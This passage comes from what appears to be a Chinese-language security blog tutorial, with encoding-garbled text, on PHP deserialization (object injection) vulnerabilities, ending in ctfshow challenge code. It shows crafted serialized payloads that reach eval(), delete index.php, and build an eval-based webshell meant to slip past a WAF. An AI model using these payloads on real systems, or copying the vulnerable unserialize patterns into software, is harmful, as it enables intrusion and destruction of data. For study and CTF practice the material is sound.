class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>PHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20201112222505683.png"></p><p>ä¿®æ”¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸² ç„¶åä¼ å›ä»£ç è¿›è¡Œååºåˆ—åŒ– è€Œæ­¤æ—¶æ¶æ„ä»£ç å°±è¢«æ‰§è¡Œäº†</p><h3 id="è¦†ç›–è¾“å‡º"><a href="#è¦†ç›–è¾“å‡º" class="headerlink" title="è¦†ç›–è¾“å‡º"></a>è¦†ç›–è¾“å‡º</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//å¾—åˆ° O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¼ å‚å›å»<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612154244475.png"></p><p>ååºåˆ—åŒ–åå°±ä¼šè°ƒç”¨__destruct å‡½æ•°ï¼ŒåŒæ—¶è¦†ç›–$test=demo è¾“å‡º hello world</p><h3 id="å›é©¬æª"><a href="#å›é©¬æª" class="headerlink" title="å›é©¬æª"></a>å›é©¬æª</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//å¾—åˆ°ï¼šO:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹ï¼šO:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/02/.png"></p><h3 id="æ¶æ„åˆ é™¤-index-php-ç­‰é‡è¦æ–‡ä»¶"><a href="#æ¶æ„åˆ é™¤-index-php-ç­‰é‡è¦æ–‡ä»¶" class="headerlink" title="æ¶æ„åˆ é™¤ index.php ç­‰é‡è¦æ–‡ä»¶"></a>æ¶æ„åˆ é™¤ index.php ç­‰é‡è¦æ–‡ä»¶</h3><p>æŸä¸ª web åº”ç”¨ç¨‹åºä¸­ï¼Œlog.php ç”¨æ¥äº§ç”Ÿä¸´æ—¶ profile.log(æ¯”å¦‚ç”¨æˆ·ä¿®æ”¹ä¸ªäººä¿¡æ¯,ä¿®æ”¹å®Œ(__destruct è¢«è°ƒç”¨)å°±åˆ é™¤è¿™ä¸ªä¸´æ—¶æ—¥å¿—)ï¼Œç›®å½•å‡å¦‚å°±æ˜¯æ ¹ç›®å½•ï¼Œå³å­˜åœ¨ index.php å‰æ log.php æ³„éœ²ï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯æ—¶å¾—çŸ¥ååºåˆ—åŒ–ä¼ å‚å¯æ§ï¼Œè€Œä¸”ä¹Ÿç”¨åˆ°äº†ä¸´æ—¶æ—¥å¿—ã€‚</p><p>é‚£ä¹ˆå®éªŒå¼€å§‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//logæ–‡ä»¶å</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//åˆ›å»ºæ—¥å¿—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctoråˆ é™¤æ—¥å¿—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ log.php çš„ç®€å•ä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();<br><span class="hljs-comment">// è®¾ç½®æ–‡ä»¶åå’Œè¦å‚¨å­˜çš„æ—¥å¿—æ•°æ®</span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;<br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);<br><span class="hljs-comment">// è„šæœ¬ç»“æŸ__destructè¢«è°ƒç”¨somefile.logæ–‡ä»¶è¢«åˆ é™¤</span><br></code></pre></td></tr></table></figure><p>æ³¨é‡Šæ‰ log.php ä¸­çš„__destructor() å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014308067.png"></p><p>è®¿é—® test.php</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703015954924.png"></p><p>äº§ç”Ÿäº† somefile.log æ–‡ä»¶</p><p>æ¢å¤__destructor() å°±è§‚å¯Ÿä¸åˆ°è¿™ä¸ªåˆ›å»ºå’Œåˆ é™¤çš„è¿‡ç¨‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020204896.png"></p><p>ä½†ç»è¿‡ä¸Šé¢çš„æµ‹è¯• è¯´æ˜ log.php å¯ç”¨</p><p>æ¥ä¸‹æ¥ç»§ç»­</p><p>è¯¥ç½‘ç«™æœ‰å…¶ä»–åŠŸèƒ½ç‚¹ï¼Œä¹Ÿæ˜¯éœ€è¦åˆ›å»ºä¸´æ—¶æ—¥å¿—æ–‡ä»¶çš„ï¼Œæ‰€ä»¥åŒ…å«äº†åŒä¸€ä¸ªç”Ÿæˆæ—¥å¿—çš„ç±» æ¯”å¦‚æ›´æ–°ç”¨æˆ·ä¿¡æ¯ ä¸‹é¢ç¤ºä¾‹ä»£ç ä¸å«æ›´æ–°æ“ä½œï¼Œæ˜¾ç¤ºä¸€ä¸‹å°± ok äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æä¾›ååºåˆ—åŒ–çš„æ¥å£æ–‡ä»¶ profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// é‡å»ºç”¨æˆ·è¾“å…¥çš„æ•°æ®</span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php æ³¨æ„ï¼Œç›´æ¥è®¿é—®æ­¤æ–‡ä»¶index.phpä¹Ÿä¼šè¢«åˆ é™¤</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//ä¸Šé¢å·²ç»æåˆ°log.phpå·²ç»æ³„éœ²ï¼Œæ•…å¯ä»¥å¦‚æ­¤æ„é€ </span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//è¾“å‡ºï¼šO:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014910163.png"></p><p>index.php æ–‡ä»¶å­˜åœ¨å¯è®¿é—®</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020742097.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703021610114.png"></p><p>å¯è§ index.php è¢«æˆåŠŸåˆ é™¤</p><h3 id="è¿‡-WAF-ä¸€å¥è¯çš„å°è¯•"><a href="#è¿‡-WAF-ä¸€å¥è¯çš„å°è¯•" class="headerlink" title="è¿‡ WAF ä¸€å¥è¯çš„å°è¯•"></a>è¿‡ WAF ä¸€å¥è¯çš„å°è¯•</h3><p>æŸäº›æƒ…å†µä¸‹ å¯¹ä¸€å¥è¯æœ¨é©¬å˜ç§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// æ„é€ åºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// ååºåˆ—åŒ–åŒæ—¶è§¦å‘_destructå‡½æ•°</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612155638097.png"></p><h2 id="ctf-é¢˜"><a href="#ctf-é¢˜" class="headerlink" title="ctf é¢˜"></a>ctf é¢˜</h2><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span 